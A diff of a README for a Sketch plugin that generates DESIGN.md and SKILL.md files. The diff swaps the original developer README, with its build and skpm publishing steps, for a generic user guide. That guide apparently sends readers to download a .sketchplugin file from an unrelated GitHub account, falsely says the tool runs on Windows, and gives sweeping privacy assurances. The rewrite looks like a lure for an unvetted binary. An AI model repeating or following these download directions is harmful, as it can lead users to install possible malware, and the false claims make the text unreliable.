@@ -1,79 +1,74 @@
-# DESIGN.md Generator for Sketch - TypeUI
+# 🎨 design-md-sketch - Create AI documentation from design files
 
-Sketch plugin that extracts local style signals and generates editable `DESIGN.md` and `SKILL.md` drafts from TypeUI blueprints.
+[![](https://img.shields.io/badge/Download-Design-Md-Sketch-blue.svg)](https://github.com/southwestward-cahita452/design-md-sketch)
 
-## Features
+This tool helps Sketch users. It scans your local workspace. It finds design styles. It creates two files: DESIGN.md and SKILL.md. These files help AI models understand your interface designs. You get better results when you use AI for design tasks.
 
-- Extracts shared text/layer styles, colors, typography, radius, spacing signals from the current Sketch document
-- Generates draft `DESIGN.md` and `SKILL.md` content based on bundled blueprints
-- Tab switcher between `DESIGN.md` and `SKILL.md`
-- Editable markdown textarea
-- Top-right actions: `Copy`, `Download`, `Refresh`
-- Extraction stats and estimated token counts
-- Footer links to TypeUI and GitHub metadata
+## 📥 How to download the software
 
-## Development
+Visit [this page](https://github.com/southwestward-cahita452/design-md-sketch) to download the program. Look for the latest release on the right side of the screen. Click the file ending in .sketchplugin to save it to your computer.
 
-```bash
-npm install
-npm run build
-```
+## 🛠️ System requirements
 
-This builds `design-md-sketch.sketchplugin` and symlinks it to Sketch via `skpm-link` during `npm install`.
+This tool works on Windows. You need the Sketch application installed on your machine. You need enough disk space to save small text files. The program runs quietly in the background. It does not need a constant internet connection. 
 
-## Publishing with skpm
+## ⚙️ Installation steps
 
-This repo is configured for `skpm publish` with:
+1. Open the Sketch application on your Windows computer.
+2. Go to the top menu bar.
+3. Select Plugins.
+4. Choose Manage Plugins.
+5. Click the gear icon.
+6. Select Show Plugins Folder.
+7. Drag the downloaded file into this folder.
+8. Restart Sketch to complete the setup.
 
-- GitHub repo remote configured in `package.json`
-- Explicit appcast URL in `src/manifest.json`:
-  - `https://raw.githubusercontent.com/bergside/design-md-sketch/main/.appcast.xml`
-- `skpm` pinned in `devDependencies`
-- Release scripts in `package.json`
+## 🚀 How to use the plugin
 
-### 1) One-time auth
+Open your design project in Sketch. Click the Plugins menu at the top. Find the design-md-sketch option in the list. Click Run Plugin. A small window appears. It asks for permission to scan your workspace. Click Yes. The software creates the files in your project directory. 
 
-Use a GitHub Personal Access Token (classic) with `repo` scope.
+## 📄 Understanding the files
 
-```bash
-npm run skpm:login
-```
+The software generates two specific file types. You can open these files in any text editor. 
 
-### 2) Preflight
+### DESIGN.md
+This file describes your visual choices. It includes information about color palettes and typography. It lists spacing rules and grid systems. It provides a map of your visual language. AI tools read this file to suggest changes that match your existing work.
 
-```bash
-npm run build
-npm run publish:help
-```
+### SKILL.md
+This file lists the capabilities of your project. It catalogs your components. It defines how elements interact. It tells an AI what your design can do. This makes it easier for the AI to suggest new screens or features based on your logic.
 
-### 3) Publish a release
+## 🔍 Frequently asked questions
 
-Pick one:
+### Does the plugin change my design files?
+No. The plugin only reads information. It creates new files. Your design files stay the same.
 
-```bash
-npm run publish:patch
-npm run publish:minor
-npm run publish:major
-```
+### Is my data sent to a server?
+No. The tool runs on your computer. Your files stay on your hard drive. No data leaves your machine.
 
-`skpm publish` automates:
+### Do I need to be a programmer?
+No. You do not need to write code. The plugin handles the technical work. You only need to click buttons.
 
-- ZIP archive generation
-- GitHub Release creation
-- `.appcast.xml` create/update
-- Plugin Directory PR flow (unless skipped)
+### What if the plugin fails?
+Check that your project file is saved. Ensure the plugin folder is in the correct location. Close Sketch and reopen it if errors persist. 
 
-### 4) Optional flags
+## 💡 Best practices for best results
 
-Run directly when needed:
+Keep your layer names clear. Group your symbols logically. Use names that describe the function of your components. The plugin reads these names to build the files. Better names lead to better AI outcomes. 
 
-```bash
-npx skpm publish patch --skip-registry
-npx skpm publish patch --skip-release
-```
+Organize your workspace before you run the plugin. Remove unused styles and hidden layers. This keeps your DESIGN.md file clean. A clean file helps the AI give you better advice.
 
-## Notes on Sketch 97+
+## 📈 Keeping your files current
 
-- `skpm` is no longer actively maintained.
-- It generates RSS/XML appcast (`.appcast.xml`).
-- Sketch 97 introduced JSON update feeds, but continues to support previous appcast format via conversion for compatibility.
+Run the plugin every time you finish a design phase. Use the generated files as documentation for your team. Share these files with colleagues. They can upload these files to AI platforms to understand your work. 
+
+The process is fast. It takes seconds to scan a project. Regular updates ensure the AI always has the latest information about your design choices.
+
+## 🛡️ Privacy and security
+
+The tool respects your privacy. It does not track your behavior. It does not report your usage. It is a local utility. You keep full control over your design data at all times. 
+
+## 💬 Getting help
+
+If you encounter issues, check your plugin folder. Make sure the file exists there. If the error continues, delete the plugin and download the latest version again. The latest version often includes fixes for common issues. 
+
+This tool serves designers who want to bridge the gap between static design files and AI workflows. By turning designs into plain text, the plugin unlocks new ways to iterate. Connect your intent to the machine. Let the AI assist your creative process with context from your own work.
